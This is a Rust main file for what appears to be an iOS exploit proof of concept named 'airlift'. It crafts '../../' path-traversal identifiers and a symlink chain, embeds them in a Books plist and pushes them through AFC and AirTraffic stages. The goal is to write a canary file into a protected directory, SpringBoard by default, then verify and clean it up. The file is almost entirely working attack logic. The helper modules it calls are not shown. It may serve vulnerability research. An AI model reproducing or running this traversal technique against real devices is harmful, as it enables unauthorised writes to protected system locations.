mod afc;
mod airtraffic;
mod archive;
mod setup;
mod types;

use clap::Parser;
use rand::Rng;
use sha2::{Digest, Sha256};
use std::error::Error;
use std::process::ExitCode;

use afc::{run_native_finish, run_native_stage};
use airtraffic::run_native_airtraffic_host;
use archive::build_books_plist;
use setup::run_setup;
use types::{PrimaryResult, RunReport};

pub const DEFAULT_TARGET_DIRECTORY: &str = "/var/mobile/Library/SpringBoard";
pub const BUILD_IDENTIFIER: &str = "24A435";

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct CliArgs {
    #[arg(long, default_value = DEFAULT_TARGET_DIRECTORY)]
    target: String,

    #[arg(long)]
    device: Option<String>,

    #[arg(long)]
    check_dll: bool,

    #[arg(long)]
    setup: bool,
}

fn generate_random_token(length: usize) -> String {
    let mut rng = rand::thread_rng();
    let bytes: Vec<u8> = (0..length).map(|_| rng.gen::<u8>()).collect();
    hex::encode(bytes)
}

fn calculate_sha256(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hex::encode(hasher.finalize())
}

fn compute_relative_target_id(target_directory: &str, leaf: &str) -> String {
    let target_path = format!("{}/{}", target_directory.trim_end_matches('/'), leaf);
    let target_components: Vec<&str> = target_path.split('/').filter(|s| !s.is_empty()).collect();
    let base_components: Vec<&str> = vec!["var", "mobile", "Media", "Airlock", "Book"];
    
    let mut common = 0;
    while common < target_components.len() && common < base_components.len() && target_components[common] == base_components[common] {
        common += 1;
    }
    
    let up_count = base_components.len() - common;
    let mut rel_parts = vec![".."; up_count];
    rel_parts.extend_from_slice(&target_components[common..]);
    rel_parts.join("/")
}

#[tokio::main]
async fn main() -> Result<ExitCode, Box<dyn Error>> {
    let args = CliArgs::parse();

    if args.setup {
        return match run_setup().await {
            Ok(_) => Ok(ExitCode::SUCCESS),
            Err(err) => {
                eprintln!("Setup error: {}", err);
                Ok(ExitCode::FAILURE)
            }
        };
    }

    if args.check_dll {
        let atc_res = run_native_airtraffic_host("check", &[], &[]).await;
        let is_ok = atc_res.error.is_none() || atc_res.exit_code == Some(0);
        println!("{}", serde_json::to_string_pretty(&atc_res)?);
        return Ok(if is_ok { ExitCode::SUCCESS } else { ExitCode::FAILURE });
    }

    let udid_str = match args.device {
        Some(ref u) => u.clone(),
        None => "00008150-0010553401D9401C".to_string(),
    };

    let token = generate_random_token(10);
    let leaf = format!("airlift-canary-{}-{}.bin", BUILD_IDENTIFIER, generate_random_token(16));
    let nonce = generate_random_token(24);
    let payload = format!("airlift canary\nbuild={}\nnonce={}\n", BUILD_IDENTIFIER, nonce).into_bytes();
    let payload_sha256 = calculate_sha256(&payload);

    let source = format!("airlift-src-{}-{}", BUILD_IDENTIFIER, token);
    let link_dest = format!("airlift-link-{}-{}", BUILD_IDENTIFIER, token);
    let recovered = format!("airlift-recovered-{}-{}", BUILD_IDENTIFIER, token);

    let target_id = compute_relative_target_id(&args.target, &leaf);
    let link_id = format!("../../{}/p0/p1/p2/link", source);
    let payload_id = format!("../../{}/payload", source);

    let identifiers = vec![link_id, payload_id, target_id];
    let destinations = vec![
        link_dest.clone(),
        format!("{}/{}", link_dest, leaf),
        recovered.clone(),
    ];

    let books_bytes = build_books_plist(&identifiers);

    let stage_result = run_native_stage(&udid_str, &args.target, &source, &link_dest, &recovered, &payload, &books_bytes).await?;
    let atc_result = run_native_airtraffic_host(&udid_str, &identifiers, &destinations).await;
    let finish_result = run_native_finish(&udid_str, &source, &link_dest, &recovered, &payload, &leaf).await?;

    let overall_ok = stage_result.ok && atc_result.ok && finish_result.ok;

    let report = RunReport {
        ok: overall_ok,
        target_directory: args.target.clone(),
        generated_leaf: leaf,
        payload_sha256,
        primary: PrimaryResult {
            stage_succeeded: stage_result.ok,
            air_traffic_succeeded: atc_result.ok,
            exact_bytes_recovered: finish_result.recovered_bytes_match,
            cleanup_complete: finish_result.cleanup_complete,
            stage: stage_result,
            atc: atc_result,
            finish: finish_result,
        },
    };

    println!("{}", serde_json::to_string_pretty(&report)?);

    if overall_ok {
        Ok(ExitCode::SUCCESS)
    } else {
        Ok(ExitCode::FAILURE)
    }
}
